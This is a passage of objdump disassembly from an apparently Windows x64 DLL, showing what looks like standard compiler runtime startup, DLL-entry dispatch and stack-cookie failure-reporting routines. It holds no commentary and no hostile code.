   180001d92:	48 83 c2 28          	add    $0x28,%rdx
   180001d96:	eb df                	jmp    0x180001d77
   180001d98:	33 d2                	xor    %edx,%edx
   180001d9a:	48 85 d2             	test   %rdx,%rdx
   180001d9d:	75 04                	jne    0x180001da3
   180001d9f:	32 c0                	xor    %al,%al
   180001da1:	eb 14                	jmp    0x180001db7
   180001da3:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180001da7:	7d 04                	jge    0x180001dad
   180001da9:	32 c0                	xor    %al,%al
   180001dab:	eb 0a                	jmp    0x180001db7
   180001dad:	b0 01                	mov    $0x1,%al
   180001daf:	eb 06                	jmp    0x180001db7
   180001db1:	32 c0                	xor    %al,%al
   180001db3:	eb 02                	jmp    0x180001db7
   180001db5:	32 c0                	xor    %al,%al
   180001db7:	48 83 c4 18          	add    $0x18,%rsp
   180001dbb:	c3                   	ret
   180001dbc:	40 53                	rex push %rbx
   180001dbe:	48 83 ec 20          	sub    $0x20,%rsp
   180001dc2:	8a d9                	mov    %cl,%bl
   180001dc4:	e8 a7 08 00 00       	call   0x180002670
   180001dc9:	33 d2                	xor    %edx,%edx
   180001dcb:	85 c0                	test   %eax,%eax
   180001dcd:	74 0b                	je     0x180001dda
   180001dcf:	84 db                	test   %bl,%bl
   180001dd1:	75 07                	jne    0x180001dda
   180001dd3:	48 87 15 2e 8d 01 00 	xchg   %rdx,0x18d2e(%rip)        # 0x18001ab08
   180001dda:	48 83 c4 20          	add    $0x20,%rsp
   180001dde:	5b                   	pop    %rbx
   180001ddf:	c3                   	ret
   180001de0:	40 53                	rex push %rbx
   180001de2:	48 83 ec 20          	sub    $0x20,%rsp
   180001de6:	80 3d 23 8d 01 00 00 	cmpb   $0x0,0x18d23(%rip)        # 0x18001ab10
   180001ded:	8a d9                	mov    %cl,%bl
   180001def:	74 04                	je     0x180001df5
   180001df1:	84 d2                	test   %dl,%dl
   180001df3:	75 0c                	jne    0x180001e01
   180001df5:	e8 46 58 00 00       	call   0x180007640
   180001dfa:	8a cb                	mov    %bl,%cl
   180001dfc:	e8 0f 16 00 00       	call   0x180003410
   180001e01:	b0 01                	mov    $0x1,%al
   180001e03:	48 83 c4 20          	add    $0x20,%rsp
   180001e07:	5b                   	pop    %rbx
   180001e08:	c3                   	ret
   180001e09:	cc                   	int3
   180001e0a:	cc                   	int3
   180001e0b:	cc                   	int3
   180001e0c:	40 53                	rex push %rbx
   180001e0e:	48 83 ec 20          	sub    $0x20,%rsp
   180001e12:	48 83 3d fe 8c 01 00 	cmpq   $0xffffffffffffffff,0x18cfe(%rip)        # 0x18001ab18
   180001e19:	ff 
   180001e1a:	48 8b d9             	mov    %rcx,%rbx
   180001e1d:	75 07                	jne    0x180001e26
   180001e1f:	e8 f8 55 00 00       	call   0x18000741c
   180001e24:	eb 0f                	jmp    0x180001e35
   180001e26:	48 8b d3             	mov    %rbx,%rdx
   180001e29:	48 8d 0d e8 8c 01 00 	lea    0x18ce8(%rip),%rcx        # 0x18001ab18
   180001e30:	e8 5b 56 00 00       	call   0x180007490
   180001e35:	33 d2                	xor    %edx,%edx
   180001e37:	85 c0                	test   %eax,%eax
   180001e39:	48 0f 44 d3          	cmove  %rbx,%rdx
   180001e3d:	48 8b c2             	mov    %rdx,%rax
   180001e40:	48 83 c4 20          	add    $0x20,%rsp
   180001e44:	5b                   	pop    %rbx
   180001e45:	c3                   	ret
   180001e46:	cc                   	int3
   180001e47:	cc                   	int3
   180001e48:	48 83 ec 28          	sub    $0x28,%rsp
   180001e4c:	e8 bb ff ff ff       	call   0x180001e0c
   180001e51:	48 f7 d8             	neg    %rax
   180001e54:	1b c0                	sbb    %eax,%eax
   180001e56:	f7 d8                	neg    %eax
   180001e58:	ff c8                	dec    %eax
   180001e5a:	48 83 c4 28          	add    $0x28,%rsp
   180001e5e:	c3                   	ret
   180001e5f:	cc                   	int3
   180001e60:	e9 6f 09 00 00       	jmp    0x1800027d4
   180001e65:	cc                   	int3
   180001e66:	cc                   	int3
   180001e67:	cc                   	int3
   180001e68:	40 53                	rex push %rbx
   180001e6a:	48 83 ec 20          	sub    $0x20,%rsp
   180001e6e:	48 8b d9             	mov    %rcx,%rbx
   180001e71:	eb 0f                	jmp    0x180001e82
   180001e73:	48 8b cb             	mov    %rbx,%rcx
   180001e76:	e8 15 58 00 00       	call   0x180007690
   180001e7b:	85 c0                	test   %eax,%eax
   180001e7d:	74 13                	je     0x180001e92
   180001e7f:	48 8b cb             	mov    %rbx,%rcx
   180001e82:	e8 6d 58 00 00       	call   0x1800076f4
   180001e87:	48 85 c0             	test   %rax,%rax
   180001e8a:	74 e7                	je     0x180001e73
   180001e8c:	48 83 c4 20          	add    $0x20,%rsp
   180001e90:	5b                   	pop    %rbx
   180001e91:	c3                   	ret
   180001e92:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   180001e96:	74 06                	je     0x180001e9e
   180001e98:	e8 3f 09 00 00       	call   0x1800027dc
   180001e9d:	cc                   	int3
   180001e9e:	e8 8d f9 ff ff       	call   0x180001830
   180001ea3:	cc                   	int3
   180001ea4:	40 53                	rex push %rbx
   180001ea6:	48 83 ec 20          	sub    $0x20,%rsp
   180001eaa:	48 8d 05 d7 e4 00 00 	lea    0xe4d7(%rip),%rax        # 0x180010388
   180001eb1:	48 8b d9             	mov    %rcx,%rbx
   180001eb4:	48 89 01             	mov    %rax,(%rcx)
   180001eb7:	f6 c2 01             	test   $0x1,%dl
   180001eba:	74 0a                	je     0x180001ec6
   180001ebc:	ba 18 00 00 00       	mov    $0x18,%edx
   180001ec1:	e8 9a ff ff ff       	call   0x180001e60
   180001ec6:	48 8b c3             	mov    %rbx,%rax
   180001ec9:	48 83 c4 20          	add    $0x20,%rsp
   180001ecd:	5b                   	pop    %rbx
   180001ece:	c3                   	ret
   180001ecf:	cc                   	int3
   180001ed0:	48 83 ec 28          	sub    $0x28,%rsp
   180001ed4:	85 d2                	test   %edx,%edx
   180001ed6:	74 39                	je     0x180001f11
   180001ed8:	83 ea 01             	sub    $0x1,%edx
   180001edb:	74 28                	je     0x180001f05
   180001edd:	83 ea 01             	sub    $0x1,%edx
   180001ee0:	74 16                	je     0x180001ef8
   180001ee2:	83 fa 01             	cmp    $0x1,%edx
   180001ee5:	74 0a                	je     0x180001ef1
   180001ee7:	b8 01 00 00 00       	mov    $0x1,%eax
   180001eec:	48 83 c4 28          	add    $0x28,%rsp
   180001ef0:	c3                   	ret
   180001ef1:	e8 9a fc ff ff       	call   0x180001b90
   180001ef6:	eb 05                	jmp    0x180001efd
   180001ef8:	e8 6b fc ff ff       	call   0x180001b68
   180001efd:	0f b6 c0             	movzbl %al,%eax
   180001f00:	48 83 c4 28          	add    $0x28,%rsp
   180001f04:	c3                   	ret
   180001f05:	49 8b d0             	mov    %r8,%rdx
   180001f08:	48 83 c4 28          	add    $0x28,%rsp
   180001f0c:	e9 0f 00 00 00       	jmp    0x180001f20
   180001f11:	4d 85 c0             	test   %r8,%r8
   180001f14:	0f 95 c1             	setne  %cl
   180001f17:	48 83 c4 28          	add    $0x28,%rsp
   180001f1b:	e9 18 01 00 00       	jmp    0x180002038
   180001f20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001f25:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001f2a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180001f2f:	41 56                	push   %r14
   180001f31:	48 83 ec 20          	sub    $0x20,%rsp
   180001f35:	48 8b f2             	mov    %rdx,%rsi
   180001f38:	4c 8b f1             	mov    %rcx,%r14
   180001f3b:	33 c9                	xor    %ecx,%ecx
   180001f3d:	e8 0a fd ff ff       	call   0x180001c4c
   180001f42:	84 c0                	test   %al,%al
   180001f44:	0f 84 c8 00 00 00    	je     0x180002012
   180001f4a:	e8 91 fb ff ff       	call   0x180001ae0
   180001f4f:	8a d8                	mov    %al,%bl
   180001f51:	88 44 24 40          	mov    %al,0x40(%rsp)
   180001f55:	40 b7 01             	mov    $0x1,%dil
   180001f58:	83 3d a1 8b 01 00 00 	cmpl   $0x0,0x18ba1(%rip)        # 0x18001ab00
   180001f5f:	0f 85 c5 00 00 00    	jne    0x18000202a
   180001f65:	c7 05 91 8b 01 00 01 	movl   $0x1,0x18b91(%rip)        # 0x18001ab00
   180001f6c:	00 00 00 
   180001f6f:	e8 dc fb ff ff       	call   0x180001b50
   180001f74:	84 c0                	test   %al,%al
   180001f76:	74 4f                	je     0x180001fc7
   180001f78:	e8 7b 09 00 00       	call   0x1800028f8
   180001f7d:	e8 26 09 00 00       	call   0x1800028a8
   180001f82:	e8 4d 09 00 00       	call   0x1800028d4
   180001f87:	48 8d 15 2a e3 00 00 	lea    0xe32a(%rip),%rdx        # 0x1800102b8
   180001f8e:	48 8d 0d 03 e3 00 00 	lea    0xe303(%rip),%rcx        # 0x180010298
   180001f95:	e8 c6 57 00 00       	call   0x180007760
   180001f9a:	85 c0                	test   %eax,%eax
   180001f9c:	75 29                	jne    0x180001fc7
   180001f9e:	e8 79 fb ff ff       	call   0x180001b1c
   180001fa3:	84 c0                	test   %al,%al
   180001fa5:	74 20                	je     0x180001fc7
   180001fa7:	48 8d 15 e2 e2 00 00 	lea    0xe2e2(%rip),%rdx        # 0x180010290
   180001fae:	48 8d 0d cb e2 00 00 	lea    0xe2cb(%rip),%rcx        # 0x180010280
   180001fb5:	e8 42 57 00 00       	call   0x1800076fc
   180001fba:	c7 05 3c 8b 01 00 02 	movl   $0x2,0x18b3c(%rip)        # 0x18001ab00
   180001fc1:	00 00 00 
   180001fc4:	40 32 ff             	xor    %dil,%dil
   180001fc7:	8a cb                	mov    %bl,%cl
   180001fc9:	e8 ee fd ff ff       	call   0x180001dbc
   180001fce:	40 84 ff             	test   %dil,%dil
   180001fd1:	75 3f                	jne    0x180002012
   180001fd3:	e8 18 09 00 00       	call   0x1800028f0
   180001fd8:	48 8b d8             	mov    %rax,%rbx
   180001fdb:	48 83 38 00          	cmpq   $0x0,(%rax)
   180001fdf:	74 24                	je     0x180002005
   180001fe1:	48 8b c8             	mov    %rax,%rcx
   180001fe4:	e8 3b fd ff ff       	call   0x180001d24
   180001fe9:	84 c0                	test   %al,%al
   180001feb:	74 18                	je     0x180002005
   180001fed:	4c 8b c6             	mov    %rsi,%r8
   180001ff0:	ba 02 00 00 00       	mov    $0x2,%edx
   180001ff5:	49 8b ce             	mov    %r14,%rcx
   180001ff8:	48 8b 03             	mov    (%rbx),%rax
   180001ffb:	4c 8b 0d 66 e2 00 00 	mov    0xe266(%rip),%r9        # 0x180010268
   180002002:	41 ff d1             	call   *%r9
   180002005:	ff 05 3d 8b 01 00    	incl   0x18b3d(%rip)        # 0x18001ab48
   18000200b:	b8 01 00 00 00       	mov    $0x1,%eax
   180002010:	eb 02                	jmp    0x180002014
   180002012:	33 c0                	xor    %eax,%eax
   180002014:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002019:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000201e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180002023:	48 83 c4 20          	add    $0x20,%rsp
   180002027:	41 5e                	pop    %r14
   180002029:	c3                   	ret
   18000202a:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000202f:	e8 50 06 00 00       	call   0x180002684
   180002034:	90                   	nop
   180002035:	cc                   	int3
   180002036:	cc                   	int3
   180002037:	cc                   	int3
   180002038:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000203d:	57                   	push   %rdi
   18000203e:	48 83 ec 30          	sub    $0x30,%rsp
   180002042:	40 8a f9             	mov    %cl,%dil
   180002045:	8b 05 fd 8a 01 00    	mov    0x18afd(%rip),%eax        # 0x18001ab48
   18000204b:	85 c0                	test   %eax,%eax
   18000204d:	7f 0d                	jg     0x18000205c
   18000204f:	33 c0                	xor    %eax,%eax
   180002051:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180002056:	48 83 c4 30          	add    $0x30,%rsp
   18000205a:	5f                   	pop    %rdi
   18000205b:	c3                   	ret
   18000205c:	ff c8                	dec    %eax
   18000205e:	89 05 e4 8a 01 00    	mov    %eax,0x18ae4(%rip)        # 0x18001ab48
   180002064:	e8 77 fa ff ff       	call   0x180001ae0
   180002069:	8a d8                	mov    %al,%bl
   18000206b:	88 44 24 20          	mov    %al,0x20(%rsp)
   18000206f:	83 3d 8a 8a 01 00 02 	cmpl   $0x2,0x18a8a(%rip)        # 0x18001ab00
   180002076:	75 37                	jne    0x1800020af
   180002078:	e8 8b fb ff ff       	call   0x180001c08
   18000207d:	e8 36 08 00 00       	call   0x1800028b8
   180002082:	e8 ad 08 00 00       	call   0x180002934
   180002087:	83 25 72 8a 01 00 00 	andl   $0x0,0x18a72(%rip)        # 0x18001ab00
   18000208e:	8a cb                	mov    %bl,%cl
   180002090:	e8 27 fd ff ff       	call   0x180001dbc
   180002095:	33 d2                	xor    %edx,%edx
   180002097:	40 8a cf             	mov    %dil,%cl
   18000209a:	e8 41 fd ff ff       	call   0x180001de0
   18000209f:	f6 d8                	neg    %al
   1800020a1:	1b db                	sbb    %ebx,%ebx
   1800020a3:	83 e3 01             	and    $0x1,%ebx
   1800020a6:	e8 8d fb ff ff       	call   0x180001c38
   1800020ab:	8b c3                	mov    %ebx,%eax
   1800020ad:	eb a2                	jmp    0x180002051
   1800020af:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800020b4:	e8 cb 05 00 00       	call   0x180002684
   1800020b9:	90                   	nop
   1800020ba:	90                   	nop
   1800020bb:	cc                   	int3
   1800020bc:	48 8b c4             	mov    %rsp,%rax
   1800020bf:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800020c3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800020c7:	89 50 10             	mov    %edx,0x10(%rax)
   1800020ca:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800020ce:	56                   	push   %rsi
   1800020cf:	57                   	push   %rdi
   1800020d0:	41 56                	push   %r14
   1800020d2:	48 83 ec 40          	sub    $0x40,%rsp
   1800020d6:	49 8b f0             	mov    %r8,%rsi
   1800020d9:	8b fa                	mov    %edx,%edi
   1800020db:	4c 8b f1             	mov    %rcx,%r14
   1800020de:	85 d2                	test   %edx,%edx
   1800020e0:	75 0f                	jne    0x1800020f1
   1800020e2:	39 15 60 8a 01 00    	cmp    %edx,0x18a60(%rip)        # 0x18001ab48
   1800020e8:	7f 07                	jg     0x1800020f1
   1800020ea:	33 c0                	xor    %eax,%eax
   1800020ec:	e9 ee 00 00 00       	jmp    0x1800021df
   1800020f1:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800020f4:	83 f8 01             	cmp    $0x1,%eax
   1800020f7:	77 45                	ja     0x18000213e
   1800020f9:	48 8b 05 90 e2 00 00 	mov    0xe290(%rip),%rax        # 0x180010390
   180002100:	48 85 c0             	test   %rax,%rax
   180002103:	75 0a                	jne    0x18000210f
   180002105:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   18000210c:	00 
   18000210d:	eb 14                	jmp    0x180002123
   18000210f:	ff 15 53 e1 00 00    	call   *0xe153(%rip)        # 0x180010268
   180002115:	8b d8                	mov    %eax,%ebx
   180002117:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000211b:	85 c0                	test   %eax,%eax
   18000211d:	0f 84 b2 00 00 00    	je     0x1800021d5
   180002123:	4c 8b c6             	mov    %rsi,%r8
   180002126:	8b d7                	mov    %edi,%edx
   180002128:	49 8b ce             	mov    %r14,%rcx
   18000212b:	e8 a0 fd ff ff       	call   0x180001ed0
   180002130:	8b d8                	mov    %eax,%ebx
   180002132:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002136:	85 c0                	test   %eax,%eax
   180002138:	0f 84 97 00 00 00    	je     0x1800021d5
   18000213e:	4c 8b c6             	mov    %rsi,%r8
   180002141:	8b d7                	mov    %edi,%edx
   180002143:	49 8b ce             	mov    %r14,%rcx
   180002146:	e8 a5 f0 ff ff       	call   0x1800011f0
   18000214b:	8b d8                	mov    %eax,%ebx
   18000214d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002151:	83 ff 01             	cmp    $0x1,%edi
   180002154:	75 36                	jne    0x18000218c
   180002156:	85 c0                	test   %eax,%eax
   180002158:	75 32                	jne    0x18000218c
   18000215a:	4c 8b c6             	mov    %rsi,%r8
   18000215d:	33 d2                	xor    %edx,%edx
   18000215f:	49 8b ce             	mov    %r14,%rcx
   180002162:	e8 89 f0 ff ff       	call   0x1800011f0
   180002167:	48 85 f6             	test   %rsi,%rsi
   18000216a:	0f 95 c1             	setne  %cl
   18000216d:	e8 c6 fe ff ff       	call   0x180002038
   180002172:	48 8b 05 17 e2 00 00 	mov    0xe217(%rip),%rax        # 0x180010390
   180002179:	48 85 c0             	test   %rax,%rax
   18000217c:	74 0e                	je     0x18000218c
   18000217e:	4c 8b c6             	mov    %rsi,%r8
   180002181:	33 d2                	xor    %edx,%edx
   180002183:	49 8b ce             	mov    %r14,%rcx
   180002186:	ff 15 dc e0 00 00    	call   *0xe0dc(%rip)        # 0x180010268
   18000218c:	85 ff                	test   %edi,%edi
   18000218e:	74 05                	je     0x180002195
   180002190:	83 ff 03             	cmp    $0x3,%edi
   180002193:	75 40                	jne    0x1800021d5
   180002195:	4c 8b c6             	mov    %rsi,%r8
   180002198:	8b d7                	mov    %edi,%edx
   18000219a:	49 8b ce             	mov    %r14,%rcx
   18000219d:	e8 2e fd ff ff       	call   0x180001ed0
   1800021a2:	8b d8                	mov    %eax,%ebx
   1800021a4:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800021a8:	85 c0                	test   %eax,%eax
   1800021aa:	74 29                	je     0x1800021d5
   1800021ac:	48 8b 05 dd e1 00 00 	mov    0xe1dd(%rip),%rax        # 0x180010390
   1800021b3:	48 85 c0             	test   %rax,%rax
   1800021b6:	75 09                	jne    0x1800021c1
   1800021b8:	8d 58 01             	lea    0x1(%rax),%ebx
   1800021bb:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800021bf:	eb 14                	jmp    0x1800021d5
   1800021c1:	4c 8b c6             	mov    %rsi,%r8
   1800021c4:	8b d7                	mov    %edi,%edx
   1800021c6:	49 8b ce             	mov    %r14,%rcx
   1800021c9:	ff 15 99 e0 00 00    	call   *0xe099(%rip)        # 0x180010268
   1800021cf:	8b d8                	mov    %eax,%ebx
   1800021d1:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1800021d5:	eb 06                	jmp    0x1800021dd
   1800021d7:	33 db                	xor    %ebx,%ebx
   1800021d9:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800021dd:	8b c3                	mov    %ebx,%eax
   1800021df:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800021e4:	48 83 c4 40          	add    $0x40,%rsp
   1800021e8:	41 5e                	pop    %r14
   1800021ea:	5f                   	pop    %rdi
   1800021eb:	5e                   	pop    %rsi
   1800021ec:	c3                   	ret
   1800021ed:	cc                   	int3
   1800021ee:	cc                   	int3
   1800021ef:	cc                   	int3
   1800021f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800021f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800021fa:	57                   	push   %rdi
   1800021fb:	48 83 ec 20          	sub    $0x20,%rsp
   1800021ff:	49 8b f8             	mov    %r8,%rdi
   180002202:	8b da                	mov    %edx,%ebx
   180002204:	48 8b f1             	mov    %rcx,%rsi
   180002207:	83 fa 01             	cmp    $0x1,%edx
   18000220a:	75 05                	jne    0x180002211
   18000220c:	e8 eb 05 00 00       	call   0x1800027fc
   180002211:	4c 8b c7             	mov    %rdi,%r8
   180002214:	8b d3                	mov    %ebx,%edx
   180002216:	48 8b ce             	mov    %rsi,%rcx
   180002219:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000221e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002223:	48 83 c4 20          	add    $0x20,%rsp
   180002227:	5f                   	pop    %rdi
   180002228:	e9 8f fe ff ff       	jmp    0x1800020bc
   18000222d:	cc                   	int3
   18000222e:	cc                   	int3
   18000222f:	cc                   	int3
   180002230:	40 53                	rex push %rbx
   180002232:	48 83 ec 20          	sub    $0x20,%rsp
   180002236:	48 8b d9             	mov    %rcx,%rbx
   180002239:	33 c9                	xor    %ecx,%ecx
   18000223b:	ff 15 ff dd 00 00    	call   *0xddff(%rip)        # 0x180010040
   180002241:	48 8b cb             	mov    %rbx,%rcx
   180002244:	ff 15 ee dd 00 00    	call   *0xddee(%rip)        # 0x180010038
   18000224a:	ff 15 f8 dd 00 00    	call   *0xddf8(%rip)        # 0x180010048
   180002250:	48 8b c8             	mov    %rax,%rcx
   180002253:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180002258:	48 83 c4 20          	add    $0x20,%rsp
   18000225c:	5b                   	pop    %rbx
   18000225d:	48 ff 25 ec dd 00 00 	rex.W jmp *0xddec(%rip)        # 0x180010050
   180002264:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002269:	48 83 ec 38          	sub    $0x38,%rsp
   18000226d:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002272:	ff 15 e0 dd 00 00    	call   *0xdde0(%rip)        # 0x180010058
   180002278:	85 c0                	test   %eax,%eax
   18000227a:	74 07                	je     0x180002283
   18000227c:	b9 02 00 00 00       	mov    $0x2,%ecx
   180002281:	cd 29                	int    $0x29
   180002283:	48 8d 0d 66 89 01 00 	lea    0x18966(%rip),%rcx        # 0x18001abf0
   18000228a:	e8 c9 01 00 00       	call   0x180002458
   18000228f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180002294:	48 89 05 4d 8a 01 00 	mov    %rax,0x18a4d(%rip)        # 0x18001ace8
   18000229b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1800022a0:	48 83 c0 08          	add    $0x8,%rax
   1800022a4:	48 89 05 dd 89 01 00 	mov    %rax,0x189dd(%rip)        # 0x18001ac88
   1800022ab:	48 8b 05 36 8a 01 00 	mov    0x18a36(%rip),%rax        # 0x18001ace8
   1800022b2:	48 89 05 a7 88 01 00 	mov    %rax,0x188a7(%rip)        # 0x18001ab60
   1800022b9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800022be:	48 89 05 ab 89 01 00 	mov    %rax,0x189ab(%rip)        # 0x18001ac70
   1800022c5:	c7 05 81 88 01 00 09 	movl   $0xc0000409,0x18881(%rip)        # 0x18001ab50
   1800022cc:	04 00 c0 
   1800022cf:	c7 05 7b 88 01 00 01 	movl   $0x1,0x1887b(%rip)        # 0x18001ab54
   1800022d6:	00 00 00 
   1800022d9:	c7 05 85 88 01 00 01 	movl   $0x1,0x18885(%rip)        # 0x18001ab68
   1800022e0:	00 00 00 
   1800022e3:	b8 08 00 00 00       	mov    $0x8,%eax
   1800022e8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800022ec:	48 8d 0d 7d 88 01 00 	lea    0x1887d(%rip),%rcx        # 0x18001ab70
   1800022f3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1800022fa:	00 
   1800022fb:	b8 08 00 00 00       	mov    $0x8,%eax
   180002300:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002304:	48 8b 0d 05 7d 01 00 	mov    0x17d05(%rip),%rcx        # 0x18001a010
   18000230b:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002310:	b8 08 00 00 00       	mov    $0x8,%eax
   180002315:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180002319:	48 8b 0d e8 7c 01 00 	mov    0x17ce8(%rip),%rcx        # 0x18001a008
   180002320:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180002325:	48 8d 0d 6c e0 00 00 	lea    0xe06c(%rip),%rcx        # 0x180010398
   18000232c:	e8 ff fe ff ff       	call   0x180002230
   180002331:	48 83 c4 38          	add    $0x38,%rsp
   180002335:	c3                   	ret
   180002336:	cc                   	int3
   180002337:	cc                   	int3
   180002338:	48 83 ec 28          	sub    $0x28,%rsp
   18000233c:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002341:	e8 06 00 00 00       	call   0x18000234c
   180002346:	48 83 c4 28          	add    $0x28,%rsp
   18000234a:	c3                   	ret
   18000234b:	cc                   	int3
   18000234c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180002350:	48 83 ec 28          	sub    $0x28,%rsp
   180002354:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002359:	ff 15 f9 dc 00 00    	call   *0xdcf9(%rip)        # 0x180010058
   18000235f:	85 c0                	test   %eax,%eax
   180002361:	74 08                	je     0x18000236b
   180002363:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180002367:	8b c8                	mov    %eax,%ecx
   180002369:	cd 29                	int    $0x29
   18000236b:	48 8d 0d 7e 88 01 00 	lea    0x1887e(%rip),%rcx        # 0x18001abf0
   180002372:	e8 71 00 00 00       	call   0x1800023e8
   180002377:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   18000237c:	48 89 05 65 89 01 00 	mov    %rax,0x18965(%rip)        # 0x18001ace8
   180002383:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   180002388:	48 83 c0 08          	add    $0x8,%rax
   18000238c:	48 89 05 f5 88 01 00 	mov    %rax,0x188f5(%rip)        # 0x18001ac88
   180002393:	48 8b 05 4e 89 01 00 	mov    0x1894e(%rip),%rax        # 0x18001ace8
   18000239a:	48 89 05 bf 87 01 00 	mov    %rax,0x187bf(%rip)        # 0x18001ab60
   1800023a1:	c7 05 a5 87 01 00 09 	movl   $0xc0000409,0x187a5(%rip)        # 0x18001ab50
   1800023a8:	04 00 c0 
   1800023ab:	c7 05 9f 87 01 00 01 	movl   $0x1,0x1879f(%rip)        # 0x18001ab54
   1800023b2:	00 00 00 
   1800023b5:	c7 05 a9 87 01 00 01 	movl   $0x1,0x187a9(%rip)        # 0x18001ab68
   1800023bc:	00 00 00 
   1800023bf:	b8 08 00 00 00       	mov    $0x8,%eax
   1800023c4:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800023c8:	48 8d 0d a1 87 01 00 	lea    0x187a1(%rip),%rcx        # 0x18001ab70
   1800023cf:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1800023d3:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1800023d7:	48 8d 0d ba df 00 00 	lea    0xdfba(%rip),%rcx        # 0x180010398
   1800023de:	e8 4d fe ff ff       	call   0x180002230
   1800023e3:	48 83 c4 28          	add    $0x28,%rsp
   1800023e7:	c3                   	ret
   1800023e8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800023ed:	57                   	push   %rdi
   1800023ee:	48 83 ec 40          	sub    $0x40,%rsp
   1800023f2:	48 8b d9             	mov    %rcx,%rbx
   1800023f5:	ff 15 25 dc 00 00    	call   *0xdc25(%rip)        # 0x180010020
   1800023fb:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   180002402:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002407:	48 8b cf             	mov    %rdi,%rcx
   18000240a:	45 33 c0             	xor    %r8d,%r8d
   18000240d:	ff 15 15 dc 00 00    	call   *0xdc15(%rip)        # 0x180010028
   180002413:	48 85 c0             	test   %rax,%rax
   180002416:	74 32                	je     0x18000244a
   180002418:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000241e:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180002423:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180002428:	4c 8b c8             	mov    %rax,%r9
   18000242b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002430:	4c 8b c7             	mov    %rdi,%r8
   180002433:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180002438:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   18000243d:	33 c9                	xor    %ecx,%ecx
   18000243f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002444:	ff 15 e6 db 00 00    	call   *0xdbe6(%rip)        # 0x180010030
   18000244a:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   18000244f:	48 83 c4 40          	add    $0x40,%rsp
   180002453:	5f                   	pop    %rdi
   180002454:	c3                   	ret
   180002455:	cc                   	int3
   180002456:	cc                   	int3
   180002457:	cc                   	int3
   180002458:	40 53                	rex push %rbx
   18000245a:	56                   	push   %rsi
   18000245b:	57                   	push   %rdi
   18000245c:	48 83 ec 40          	sub    $0x40,%rsp
   180002460:	48 8b d9             	mov    %rcx,%rbx
   180002463:	ff 15 b7 db 00 00    	call   *0xdbb7(%rip)        # 0x180010020
   180002469:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180002470:	33 ff                	xor    %edi,%edi
   180002472:	45 33 c0             	xor    %r8d,%r8d
   180002475:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000247a:	48 8b ce             	mov    %rsi,%rcx
   18000247d:	ff 15 a5 db 00 00    	call   *0xdba5(%rip)        # 0x180010028
   180002483:	48 85 c0             	test   %rax,%rax
   180002486:	74 39                	je     0x1800024c1
   180002488:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000248e:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180002493:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180002498:	4c 8b c8             	mov    %rax,%r9
   18000249b:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800024a0:	4c 8b c6             	mov    %rsi,%r8
